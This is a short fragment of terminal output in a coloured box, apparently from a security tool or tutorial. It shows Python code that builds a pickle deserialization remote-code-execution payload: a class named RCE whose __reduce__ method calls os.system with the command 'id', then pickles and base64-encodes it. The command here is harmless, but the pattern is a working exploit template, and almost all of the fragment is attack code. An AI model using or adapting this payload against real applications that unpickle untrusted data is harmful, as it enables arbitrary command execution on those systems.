[34m│[0m                                                                              [34m│[0m
[34m│[0m class RCE:                                                                   [34m│[0m
[34m│[0m     def __reduce__(self):                                                    [34m│[0m
[34m│[0m         import os                                                            [34m│[0m
[34m│[0m         return (os.system, ('id',))                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m payload = base64.b64encode(pickle.dumps(RCE()))                              [34m│[0m
